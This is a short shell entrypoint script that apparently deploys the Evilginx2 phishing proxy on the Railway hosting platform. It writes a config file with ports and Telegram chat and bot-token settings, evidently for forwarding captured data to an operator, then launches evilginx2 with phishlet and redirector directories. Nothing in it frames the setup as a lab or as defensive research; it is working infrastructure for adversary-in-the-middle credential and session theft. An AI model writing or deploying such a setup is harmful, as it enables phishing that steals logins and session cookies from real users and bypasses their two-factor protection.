#!/bin/sh
set -e

mkdir -p /root/.evilginx

# Write full config.json with port from Railway env
cat > /root/.evilginx/config.json <<EOF
{
  "server_ip": "0.0.0.0",
  "http_port": 80,
  "https_port": ${PORT:-443},
  "chatid": "${CHAT_ID}",
  "teletoken": "${TELE_TOKEN}"
}
EOF

# If developer mode is desired, you can pass -developer flag here
exec /usr/local/bin/evilginx2 -p ./phishlets -t ./redirectors "$@"
